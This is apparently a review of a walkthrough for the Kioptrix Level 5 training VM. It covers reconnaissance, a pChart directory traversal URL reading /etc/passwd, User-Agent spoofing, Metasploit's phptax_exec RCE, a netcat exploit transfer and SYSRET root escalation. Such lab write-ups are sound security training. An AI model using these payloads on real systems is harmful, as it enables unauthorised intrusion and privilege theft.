# Kioptrix 5

This challenge involves exploiting a virtual machine named "Kioptrix Level 5." The objective is to gain root access by identifying and leveraging vulnerabilities within the system.

## Attack plan:

1.  **Reconnaissance (netdiscover, nmap):**
    *   **`netdiscover`:**  To identify the target VM's IP address (192.168.1.159) on the local network. The output also correctly identifies the MAC address and vendor (VMware).
    *   **`nmap -sS -A -n 192.168.1.159`:**  `nmap` command. Let's break it down:
        *   `-sS`:  SYN Stealth Scan. This is a fast and relatively stealthy scan that doesn't complete the full TCP three-way handshake.
        *   `-A`:  Enable OS detection, version detection, script scanning, and traceroute. This provides a lot of valuable information.
        *   `-n`:  Disable DNS resolution. This speeds up the scan, as it avoids potentially slow DNS lookups.
    *   **Findings:**  `nmap` identifies ports 80 (HTTP) and 8080 (HTTP) as open, running Apache 2.2.21. It also correctly guesses the OS as FreeBSD. The "403 Forbidden" on port 8080 is a crucial clue.

2.  **Initial Web Exploration (HTTP/80):**
    *   We correctly identifies that port 80 is accessible and displays a basic "It works!" page. This is a common default page for Apache.

3.  **Vulnerability Scanning (nikto):**
    *   **`nikto -h 192.168.1.159`:**  `nikto` is a web server scanner that checks for outdated software, dangerous files/CGIs, and other common vulnerabilities.
    *   **Findings:** `nikto` identifies several issues:
        *   Outdated Apache, PHP, mod_ssl, and OpenSSL versions. This is a significant finding, as outdated software often contains known vulnerabilities.
        *   Missing security headers (X-Frame-Options, X-XSS-Protection, X-Content-Type-Options). These headers help protect against various web attacks (clickjacking, XSS, MIME sniffing).
        *   **CVE-2002-0082:**  This is a critical vulnerability in mod_ssl 2.8.7 and lower, allowing for a remote buffer overflow. We note that attempts to exploit this directly failed, which is important. It shows a good understanding that not all identified vulnerabilities are easily exploitable.
        *   HTTP TRACE method enabled. This could potentially be used for Cross-Site Tracing (XST) attacks.

4.  **Directory Enumeration (dirb):**
    *   **`dirb http://192.168.1.159`:**  `dirb` is a web content scanner that brute-forces directories and files using a wordlist.
    *   **Findings:**  Initially, `dirb` finds only `/cgi-bin/` (forbidden) and `/index.html`. This is where the challenge shows good problem-solving skills. The lack of results from `dirb` prompts further investigation.

5.  **Source Code Review:**
    *   Examining the source code of `index.html` reveals a commented-out meta refresh tag: `<!-- <META HTTP-EQUIV="refresh" CONTENT="5;URL=pChart2.1.3/index.php"> -->`.  This is a *critical* finding. It points to a potentially hidden application, pChart.

6.  **pChart Vulnerability (Directory Traversal):**
    *   We correctly navigates to the pChart directory.
    *   **Google Search:**  A quick search for "pChart 2.1.3 vulnerabilities" reveals a directory traversal vulnerability. This is a classic example of how OSINT (Open Source Intelligence) is used in penetration testing.
    *   **Exploitation:**  The challenge uses the following URL: `http://192.168.1.159/examples/index.php?Action=View&Script=%2f..%2f..%2fetc/passwd`. This successfully reads the `/etc/passwd` file.
        *   `%2f` is the URL-encoded form of `/`.
        *   `..` is the "parent directory" notation.  By using `..%2f..%2f`, we navigate up the directory structure to reach the root directory (`/`) and then accesses `/etc/passwd`.

7.  **Apache Configuration File Analysis:**
    *   **`httpd.conf`:**  The challenge leverages the directory traversal vulnerability to read the Apache configuration file (`/usr/local/etc/apache22/httpd.conf`). This is a smart move, as configuration files often contain sensitive information.
    *   **Findings:** The `httpd.conf` file reveals:
        *   The location of the error log (`/var/log/httpd-error.log`).
        *   A `VirtualHost` configuration for port 8080.  This explains why port 8080 was returning a 403 error.
        *   The `DocumentRoot` for port 8080 is `/usr/local/www/apache22/data2`.
        *   Crucially, access to port 8080 is restricted based on the `User-Agent` header: `Allow from env=Mozilla4_browser`. This means only requests with a specific User-Agent string are allowed.

8.  **User-Agent Spoofing:**
    *   The challenge correctly modifies the Firefox User-Agent using `about:config`. This is a common technique to bypass User-Agent restrictions.
    *   `general.useragent.override` is set to `Mozilla/4.0 (X11; Linux x86_64; rv:10.0) Gecko/20100101 Firefox/10.0`. This matches the required `Mozilla4_browser` condition.

9.  **Accessing Port 8080 (PHPTAX):**
    *   With the modified User-Agent, the challenge successfully accesses port 8080, revealing a link to a "Tax Return Program" called PHPTAX.

10. **PHPTAX Vulnerability (Remote Code Execution):**
    *   **Google Search:**  Another Google search reveals that PHPTAX is vulnerable to a Remote Code Execution (RCE) attack.
    *   **Metasploit:**  The challenge uses Metasploit (`msfconsole`) to exploit the vulnerability:
        *   `use exploit/multi/http/phptax_exec`:  Selects the appropriate exploit module.
        *   `set RHOST 192.168.1.159`: Sets the target IP address.
        *   `set RPORT 8080`: Sets the target port.
        *   `run`: Executes the exploit.
    *   **Result:** The exploit is successful, providing a shell as the `www` user.

11. **Shell Upgrade:**
    *   `/bin/sh -i`:  The challenge upgrades the initial shell to an interactive shell. This is important for better control and functionality.

12. **Privilege Escalation (SYSRET):**
    *   **`uname -a`:**  The challenge uses `uname -a` to determine the FreeBSD version (9.0-RELEASE).
    *   **Google Search:**  A search reveals that FreeBSD 9.0 is vulnerable to the Intel SYSRET kernel privilege escalation exploit.
    *   **Exploit Transfer (netcat):**
        *   The challenge uses `netcat` (`nc`) to transfer the exploit code (saved as `sys.c`) from the Kali machine to the Kioptrix VM. This is a standard technique for transferring files during a penetration test.
        *   On Kali: `nc -lvp 1234 < sys.c` (listens on port 1234 and sends the contents of `sys.c`).
        *   On Kioptrix: `nc -nv 192.168.1.3 1234 > sys.c` (connects to Kali on port 1234 and saves the received data to `sys.c`).
    *   **Compilation and Execution:**
        *   `gcc sys.c`: Compiles the exploit code.
        *   `./a.out`: Executes the compiled exploit.
    *   **Result:** The exploit is successful, granting root access (`whoami` returns `root`).

**Key Takeaways and Improvements**

*   **Layered Security:** The VM demonstrates the importance of layered security. Multiple vulnerabilities had to be chained together to achieve root access.
*   **OSINT:** The challenge heavily relies on OSINT (Google searches) to identify vulnerabilities. This is a crucial skill for penetration testers.
*   **Configuration Review:**  Reading the `httpd.conf` file was essential to understanding the access restrictions on port 8080.
*   **Manual Exploitation:** The challenge shows a good mix of automated tools (nmap, nikto, dirb, Metasploit) and manual techniques (source code review, User-Agent spoofing, netcat file transfer).
*   **Persistence (Optional):**  After gaining root access, a real-world attacker would likely establish persistence (e.g., adding a backdoor user, installing a rootkit). This wasn't covered in the challenge, but it's an important consideration.
* **ErrorLog Analysis (Suggestion):** Since the challenge identified the location of Apache's error log, it would've been a great idea to try to read it using the directory traversal vulnerability. Error logs can sometimes contain sensitive information or reveal further attack vectors. This could be done before or after finding the VirtualHost config.
* **Alternative Exploits (Suggestion):** Given the outdated versions of Apache, PHP, and OpenSSL, there might have been other, potentially simpler, exploits available. Exploring those could be an interesting exercise. For example, searching Exploit-DB for vulnerabilities related to those specific versions.

This challenge is excellent. It demonstrates a clear, methodical approach to penetration testing, combining reconnaissance, vulnerability analysis, exploitation, and privilege escalation. The use of various tools and techniques, along with the reliance on OSINT, makes it a valuable learning resource.
